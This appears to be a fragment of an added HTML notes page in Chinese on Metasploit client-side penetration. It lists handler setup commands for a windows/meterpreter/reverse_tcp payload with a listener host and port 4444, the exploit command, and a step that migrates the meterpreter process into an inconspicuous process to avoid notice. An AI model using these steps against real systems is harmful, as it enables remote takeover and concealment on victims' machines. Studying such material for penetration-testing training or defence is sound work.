+<a name="4nl8ug829te3p1jpghnsfja769">&nbsp;&nbsp;&nbsp;设置handler</a>
+</h3>
+<h3 class="topic">
+<a name="1kvg5bqdebrqqpva8jtjeeamvd">&nbsp;&nbsp;&nbsp;&nbsp;set payload windows/meterpreter/reverse_tcp</a>
+</h3>
+<h3 class="topic">
+<a name="309uj125gmq082p4jeb1abvrh2">&nbsp;&nbsp;&nbsp;&nbsp;set lhost 192.168.1.121</a>
+</h3>
+<h3 class="topic">
+<a name="549sovdqe35cv1ovbk362p01vr">&nbsp;&nbsp;&nbsp;&nbsp;set lport 4444</a>
+</h3>
+<h3 class="topic">
+<a name="4bqutthsmk6pjnouq5h3am3rfh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置侦听的4444端口</a>
+</h3>
+<h3 class="topic">
+<a name="61f1gskdttqbnhlnk8mfdhla2v">&nbsp;&nbsp;&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="72gbldkujt8knket95pm3om8o7">&nbsp;&nbsp;将meterpreter的进程迁移到其他不可疑的进程中</a>
+</h3>
+<h3 class="topic">
+<a name="7b1nqur5iim43b7fq7j2rh85t3">&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="msf%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F_files/1va7qak0h8pt6j1a186uejmmcc.png"></p>
+</body>
+</html>
